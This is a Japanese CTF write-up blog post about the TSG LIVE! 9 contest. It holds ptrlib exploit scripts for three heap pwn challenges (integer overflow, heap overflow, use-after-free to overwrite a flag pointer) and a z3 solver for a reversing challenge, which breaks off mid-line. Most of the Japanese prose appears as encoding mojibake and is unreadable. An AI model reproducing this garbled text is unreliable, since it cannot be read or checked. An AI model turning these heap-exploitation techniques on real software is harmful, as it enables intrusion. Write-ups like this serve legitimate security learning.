---
title: TSG LIVE! 9に参加しました
url: https://ptr-yudai.hatenablog.com/entry/2022/11/20/210740
source: CTFするぞ
date: 2022-11-21
fetch_date: 2025-10-03T23:19:00.864125
---

# TSG LIVE! 9に参加しました

[![CTFсЂЎсѓІсЂъ](https://cdn.image.st-hatena.com/image/square/994ee0e012cf90178bff014bfd99123c02a89b36/backend=imagemagick;height=128;version=1;width=128/https%3A%2F%2Fcdn.user.blog.st-hatena.com%2Fblog_custom_icon%2F153103571%2F1535456424487441)](https://ptr-yudai.hatenablog.com/)

[CTFсЂЎсѓІсЂъ](https://ptr-yudai.hatenablog.com/)

[УфГУђЁсЂФсЂфсѓІ](https://blog.hatena.ne.jp/ptr-yudai/ptr-yudai.hatenablog.com/subscribe?utm_source=blogs_topright_button&utm_medium=button&utm_campaign=subscribe_blog)

# [CTFсЂЎсѓІсЂъ](https://ptr-yudai.hatenablog.com/)

## CTFС╗ЦтцќсЂ«сЂЊсЂесѓѓТЏИсЂЈсѓѕ

[2022-11-20](https://ptr-yudai.hatenablog.com/archive/2022/11/20)

# [TSG LIVE! 9сЂФтЈѓтіасЂЌсЂЙсЂЌсЂЪ](https://ptr-yudai.hatenablog.com/entry/2022/11/20/210740)

[CTF](https://ptr-yudai.hatenablog.com/archive/category/CTF)
[Writeup](https://ptr-yudai.hatenablog.com/archive/category/Writeup)

тЁѕТЌЦсђЂуџєсЂЋсѓЊсЂісЂфсЂўсЂ┐сЂ«TSG LIVE!сЂїжќІтѓгсЂЋсѓїсЂЙсЂЌсЂЪсђѓ

ТюгТЮЦт▒▒уЎ╗сѓісЂ«жђћСИГсЂДтЈѓтіасЂЎсѓІС║ѕт«џсЂДсЂЌсЂЪсЂїсђЂ[уГЉТ│бт▒▒](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%EF%BF%BD%C8%BB%EF%BF%BD)сЂФ[сЃдсЃІсЃљсЃ╝сѓхсЃФсЃ╗сѓ╣сѓ┐сѓИсѓф](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%CB%A5%D0%A1%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EB%A1%A6%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD%EF%BF%BD)сЂїсЂДсЂЇсЂЪсѓЅсЂЌсЂЈС║║жќЊсЂїтцџсЂёсѓѕсЂєсЂасЂБсЂЪсЂ«сЂДсѓГсЃБсЃ│сѓ╗сЃФсЂЌсЂЙсЂЌсЂЪсђѓ
Ти▒тцюсЂФуЎ╗сѓісЂФУАїсЂЈУЕ▒сѓѓсЂѓсЂБсЂЪсЂ«сЂДсЂЎсЂїсђЂСИђуињсЂФУАїсЂЈ[жЂјтЇіТЋ░](http://d.hatena.ne.jp/keyword/%EF%BF%BD%EF%BF%BD%C8%BE%EF%BF%BD%EF%BF%BD)сЂїС║║жќЊсЂасЂБсЂЪсЂЪсѓЂсђЂтцџТЋ░Т▒║сЂДТЌЕТюЮуЎ╗сѓісЂФсЂфсѓісЂЙсЂЌсЂЪсђѓ
ТЌЕТюЮУхисЂЇсѓІсЂцсѓЅсЂЋсЂ»т▒▒уЎ╗сѓісЂ«жГЁтіЏсЂФтІЮсѓЅсЂџ...

![ 深夜の山 > TSG\ LIVE ≒ 山 > 早朝の山 > 混雑した山](https://chart.apis.google.com/chart?cht=tx&chl=%20%E6%B7%B1%E5%A4%9C%E3%81%AE%E5%B1%B1%20%3E%20TSG%5C%20LIVE%20%E2%89%92%20%E5%B1%B1%20%3E%20%E6%97%A9%E6%9C%9D%E3%81%AE%E5%B1%B1%20%3E%20%E6%B7%B7%E9%9B%91%E3%81%97%E3%81%9F%E5%B1%B1)

* [[pwn] lose leaf](#pwn-lose-leaf)
* [[pwn] loose leaf](#pwn-loose-leaf)
* [[pwn] looose leaf](#pwn-looose-leaf)
* [[rev] anger](#rev-anger)
* [[rev] anger-against-anger](#rev-anger-against-anger)
* [ТёЪТЃ│](#ТёЪТЃ│)
* [сЂісЂЙсЂЉ](#сЂісЂЙсЂЉ)

# [pwn] lose [leaf](http://d.hatena.ne.jp/keyword/leaf)

уЏЏтцДсЂФтБісѓїсЂЪсЃЌсЃГсѓ░сЃЕсЃасЂїСИјсЂѕсѓЅсѓїсЂЙсЂЎсђѓ

```
typedef struct Page {
    struct Page *next;
    char content[];
} Page;
...
  readn(page, size);
```

тЁѕсЂФinteger overflowсѓњУдІсЂцсЂЉсЂдсЂёсЂЪсЂ«сЂДсђїТўеТЌЦжЁњжБ▓сѓЊсЂасЂІсѓЅmoraсЂЋсѓЊжаГсЂісЂІсЂЌсЂЈсЂфсЂБсЂАсѓЃсЂБсЂЪсЂ«сЂІсЂфсђЇсЂеТђЮсЂБсЂдсЂёсЂЙсЂЌсЂЪсЂїсђЂinteger overflowсЂ»ТгАсЂ«тЋЈжАїсЂДсЂЌсЂЪсђѓ
тЋЈ1сЂДсѓѓсѓѓсЂБсЂежЏБсЂЌсЂЈсЂЌсЂдсЂѕсЂѕсѓЊсѓёсЂДсђѓ

```
from ptrlib import *

def modify(index):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
def add_page(index, size, data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", str(index))
    sock.sendlineafter(": ", str(size))
    if len(data) == size:
        sock.sendafter(": ", data)
    else:
        sock.sendlineafter(": ", data)
def delete_page(index):
    sock.sendlineafter("> ", "2")
    sock.sendlineafter(": ", str(index))
def back():
    sock.sendlineafter("> ", "3")

def concat(index):
    sock.sendlineafter("> ", "2")

sock = Process("./chall")
#sock = Socket("nc 104.198.95.69 30001")

modify(0)
payload = p64(0x404140 - 8) # flag - 8
add_page(0, 0x18, payload)
back()

sock.sendlineafter("> ", "3")
sock.sendlineafter(": ", "0")

sock.sh()
```

сЃЋсЃЕсѓ░сЂї`TSGLIVE{`сЂІсѓЅтДІсЂЙсѓІсЂесЂёсЂєсЂЊсЂесЂДсђЂТюђтѕЮсЃЮсѓцсЃ│сѓ┐сѓњсЃЋсЃЕсѓ░тЁѕжаГсЂФтљЉсЂЉсЂдсЂёсЂЙсЂЌсЂЪсђѓ
жЁЇтИЃсЂЋсѓїсЂдсЂёсЂЪсѓхсЃ│сЃЌсЃФсЃЋсЃЕсѓ░сЂ»`LIVECTF{`сЂ┐сЂЪсЂёсЂфсЃЋсѓЕсЃ╝сЃъсЃЃсЃѕсЂасЂБсЂЪсЂ«сЂДсЂЮсѓїсѓњС╗ўсЂЉУХ│сЂЌсЂджђЂсѓісЂЙсЂЌсЂЪсЂїсђЂжђџсѓісЂЙсЂЏсѓЊсЂДсЂЌсЂЪсђѓ
сЂєсЂасЂєсЂасЂЌсЂдсЂёсЂдУ│фтЋЈсЂЌсЂдсѓѓсђЂУ┐ћуГћсЂ»тЋЈжАїсЂфсЂёсЂесЂ«сЂЊсЂесЂДТЏ┤сЂФтЏ░ТЃЉсђѓ8сЃљсѓцсЃѕт╝ЋсЂёсЂЪсѓЅжЁЇтИЃсЂЋсѓїсЂЪсЃЋсѓЕсЃ╝сЃъсЃЃсЃѕсЂїжќЊжЂЋсЂБсЂдсЂёсЂЙсЂЌсЂЪсђѓ
ухѓсѓЈсѓісђѓ

# [pwn] loose [leaf](http://d.hatena.ne.jp/keyword/leaf)

сѓёсѓісЂЪсЂёТћЙжАїсђѓ

```
    printf("size: ");
    unsigned size = get_int();
    Page *page = (Page *)malloc(size + 8);
    page->next = next;
    printf("data: ");
    readn(page, size);
```

сѓёсѓІсЂасЂЉсђѓ

```
sock = Socket("nc 104.198.95.69 30002")

modify(0)
add_page(0, 0xfffffff8, b"A")
add_page(1, 0x18, b"B"*0x10)
add_page(2, 0x18, b"C"*0x10)
delete_page(0)
payload = b"D"*0x48 + p64(0x404138)
add_page(1, 0xfffffff8, payload)
back()

sock.sh()
```

# [pwn] looose [leaf](http://d.hatena.ne.jp/keyword/leaf)

integer overflowсЂїТй░сЂЋсѓїсЂЙсЂЎсђѓсЂЊсЂ«ТЎѓуѓ╣сЂДсЂЙсЂаУдІсЂдсЂёсЂфсЂІсЂБсЂЪсЂ«сЂ»concatТЕЪУЃйсЂфсЂ«сЂДсђЂсЂЮсЂЊсЂФсЃљсѓ░сЂїсЂѓсѓІсЂ«сЂДсЂЌсѓЄсЂєсђѓ

```
void concat_notes(unsigned idx1, unsigned idx2, unsigned idx3) {
    notes[idx3] = notes[idx1];
    Page **cur = &notes[idx3];
    while(*cur != NULL) {
        cur = &(*cur)->next;
    }
    *cur = notes[idx2];
    notes[idx1] = NULL;
    notes[idx2] = NULL;
}
```

сЂЊсЂєсЂёсЂєТЕЪУЃйсЂ»сЂЪсЂёсЂдсЂётљїсЂўсѓцсЃ│сЃЄсЃЃсѓ»сѓ╣сѓњтЁЦсѓїсѓІсЂеуѕєТГ╗сЂЌсЂЙсЂЎсђѓ
С╗ітЏъсЂ«та┤тљѕсђЂтљїсЂўсЃфсѓ╣сЃѕсѓњжђБухљсЂЎсѓІсЂеуёАжЎљсЃФсЃ╝сЃЌсЂїсЂДсЂЇсЂЙсЂЎсђѓ
уёАжЎљсЃФсЃ╝сЃЌсЂїсЂДсЂЇсѓІсЂесђЂТюђтѕЮсЂ«сЃјсЃ╝сЃѕсѓњуа┤ТБёсЂЌсЂЪсЂесЂЇсЂФ2сЂцуЏ«сЂ«сЃјсЃ╝сЃѕсЂїТюђтѕЮсЂ«сЃјсЃ╝сЃѕсѓњТїЄсЂЌсЂЪсЂЙсЂЙсЂФсЂфсѓісђЂUse-after-FreeсЂФсЂфсѓісЂЙсЂЎсђѓ

сЂѓсЂесЂ»сЂЕсЂєсѓёсЂБсЂдсЃЮсѓцсЃ│сѓ┐жЃетѕєсѓњТЏИсЂЇТЈЏсЂѕсѓІсЂІсЂДсЂЎсЂїсђЂжЂЕтйЊсЂФсЃЂсЃБсЃ│сѓ»сѓњbackward consolidateсЂЋсЂЏсЂдсЃЮсѓцсЃ│сѓ┐жЃетѕєсЂесЃЄсЃ╝сѓ┐жЃетѕєсЂїсЂІсЂХсѓІсѓѕсЂєсЂФсЂЌсЂЙсЂЎсђѓ

```
sock = Socket("nc 104.198.95.69 30003")

modify(2)
add_page(0, 0x420, b"1"*0x420)
add_page(1, 0x500, b"1"*0x500)
delete_page(1)
back()

modify(0)
add_page(0, 0x420, b"A"*0x420)
add_page(1, 0x10, b"B"*0x10)
back()

concat(0,0,1)
modify(1)
delete_page(0)
back()
modify(2)
delete_page(0)
payload  = b"C"*0x428
payload += p64(0x404140 - 8)
add_page(0, 0x500, payload)
back()
```

ТюђтѕЮсЂ«сЃЋсЃЕсѓ░жђЂС┐АсЃЪсѓ╣сЂїсЂѓсѓісЂЙсЂЌсЂЪсЂїсђЂpwnсЂ»тЁежЃесЂД30тѕєсЂ╗сЂЕсЂДухѓсѓЈсЂБсЂдсЂёсЂЪсѓѕсЂєсЂДсЂЎсђѓ
сѓ╣сѓ│сѓбсЃюсЃ╝сЃЅсЂїСИђуъгсЂДТХѕТ╗ЁсЂЌсЂЪсЂ«сЂДТГБуб║сЂфТЎѓжќЊсЂ»тѕєсЂІсѓісЂЙсЂЏсѓЊсђѓ

# [rev] anger

ТЎѓжќЊтєЁсЂФсЂ»УДБсЂЉсЂЙсЂЏсѓЊсЂДсЂЌсЂЪсђѓ
тЋЈжАїУЄфСйЊсЂїсЂІсЂфсѓіangrсЂ«сЃљсЃ╝сѓИсЃДсЃ│сЂесЂІсЃъсѓисЃ│ТђДУЃйсЂесЂІсѓ│сЃ╝сЃЅСЙЮтГўсЂасЂБсЂЪсЂ«сЂДсђЂтЋЈжАїтљЇжђџсѓісѓГсЃгсЂфсЂїсѓЅсЃљсѓцсЃісЃфсѓњУфГсЂ┐тДІсѓЂсЂЙсЂЌсЂЪсђѓ

40тѕєсЂЈсѓЅсЂёсЂДТ░ЌтљѕсЂДтЁежЃеУфГсѓђсЂесђЂсѓГсЃбсЂёсЃќсЃГсЃЃсѓ»ТџЌтЈисЂДсЂѓсѓІсЂЊсЂесЂїтѕєсЂІсѓісЂЙсЂЎсђѓ
сЂЙсЂџсђїThis is the keyсђЇсЂесЂёсЂєжЇхсЂДУгјсЂ«SboxсЂБсЂйсЂёсѓѓсЂ«сѓњтѕЮТюЪтїќсЂЌсђЂсЂЮсЂ«тЙїсђїThis is the iv.сђЇсѓњIVсЂесЂЌсЂдсЃќсЃГсЃЃсѓ»ТџЌтЈисѓњтДІсѓЂсЂЙсЂЎсђѓ

4сЃљсѓцсЃѕсЂћсЂесЂ«ТџЌтЈитїќсѓњ4тЏъсЂЌсЂд1сЃќсЃГсЃЃсѓ»сѓњтЄдуљєсЂЌсЂЙсЂЎсЂїсђЂсЂЮсЂ«тЄдуљєУЄфСйЊсЂї2тЏъУх░сѓісЂЙсЂЎсђѓ
сЂЮсЂЌсЂдсЂЮсЂ«тЅЇтЙїсЂїтљїсЂў1сЃќсЃГсЃЃсѓ»сЂ«ТџЌтЈисЂДсѓхсЃ│сЃЅсѓцсЃЃсЃЂсЂЋсѓїсЂдсЂёсЂЙсЂЎсђѓ
сЃФсЃ╝сЃЌсѓФсѓдсЃ│сѓ┐сЂ«т«ЪУБЁсЂїсЂІсЂфсѓісѓГсЃбсЂЈсЂдтЙЕтЈитЄдуљєсЂ«т«ЪУБЁсѓњсЃЪсѓ╣сЂБсЂдТЎѓжќЊсѓњТ║ХсЂІсЂЌсЂЙсЂЌсЂЪсђѓТГ╗тѕЉсЂДсЂЎсђѓ

```
from ptrlib import *
from z3 import *

"""
typedef struct {
  char key[0xb0];
  char iv[0x10]; // +B0h
  char flag[0x100];
};
"""
with open("problem", "rb") as f: # anger
    f.seek(0x20c0)
    enc = f.read(0x40)
with open("fuck", "rb") as f: # anger-against-anger
    f.seek(0x60e0)
    enc = f.read(0x40)

def blah(c):
    return ((27 * LShR(c, 7)) ^ (2 * c)) & 0xff

sbox = flat([
    0x2073692073696854, 0x0079656b20656874,
    0x2c79b7380c0ade18, 0x0c65ba270c1cdf4c,
    0xec8d24d6c0f493ee, 0xecf441bde091fb9a,
    0x56b708bfba3a2c69, 0x5ad2b298b626f325,
], map=p64)

def rev_blk(vec):
    c1 = BitVec('c1', 8)
    c2 = BitVec('c2', 8)
    c3 = BitVec('c3', 8)
    c4 = BitVec('c4', 8)
    s = Solver()
    s.add(c2^c3^c4^blah(c1^c2) == vec[0])
    s.add(c1^c3^c4^blah(c2^c3) == vec[1])
    s.add(c1^c2^c4^blah(c3^c4) == vec[2])
    s.add(c1^c2^c3^blah(c4^c1) == vec[3])
    s.check()
    m = s.model()
    print(m)
    vec = bytes([m[c1].as_long(), m[c2].as_long(), m[c3].as_long(), m[c4].as_l...